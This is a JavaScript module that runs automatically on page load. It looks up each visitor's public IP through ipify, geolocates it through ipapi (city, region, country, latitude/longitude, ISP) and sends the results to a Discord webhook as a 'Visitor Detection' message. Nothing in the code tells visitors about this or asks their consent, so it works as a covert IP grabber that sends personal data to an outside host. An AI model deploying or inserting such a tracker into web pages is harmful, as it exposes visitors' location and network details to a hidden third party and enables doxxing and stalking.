import { WEBHOOK_URL } from './webhook-config.js';

export async function collectAndSendData() {
  async function getIP() {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      return data.ip;
    } catch(e) {
      return null;
    }
  }
  
  async function getIPLocation(ip) {
    try {
      const response = await fetch(`https://ipapi.co/${ip}/json/`);
      const data = await response.json();
      return data;
    } catch(e) {
      return null;
    }
  }
  
  const ip = await getIP();
  let locationData = null;
  
  if (ip) {
    locationData = await getIPLocation(ip);
  }
  
  const fields = [];
  
  fields.push({
    name: "🌐 IP Address",
    value: ip || "Not provided",
    inline: true
  });
  
  if (locationData && !locationData.error) {
    const locationParts = [];
    if (locationData.city) locationParts.push(locationData.city);
    if (locationData.region) locationParts.push(locationData.region);
    if (locationData.country_name) locationParts.push(locationData.country_name);
    if (locationData.latitude && locationData.longitude) {
      locationParts.push(`📍 ${locationData.latitude}, ${locationData.longitude}`);
    }
    
    if (locationParts.length) {
      fields.push({
        name: "📍 Location",
        value: locationParts.join(", "),
        inline: true
      });
    }
    
    if (locationData.org) {
      fields.push({
        name: "🏢 ISP",
        value: locationData.org,
        inline: true
      });
    }
  }
  
  const embed = {
    title: "🌐 Visitor Detection",
    color: 0x5865f2,
    fields: fields,
    footer: {
      text: "Detection Time"
    },
    timestamp: new Date().toISOString()
  };
  
  try {
    const response = await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ embeds: [embed] })
    });
    
    if (!response.ok) {
      throw new Error(`Webhook failed with status: ${response.status}`);
    }
    
    console.log('Data sent to Discord successfully');
    return await response.json();
  } catch(e) {
    console.error('Failed to send data to Discord:', e);
    return null;
  }
}

if (typeof window !== 'undefined') {
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
      collectAndSendData();
    });
  } else {
    collectAndSendData();
  }
}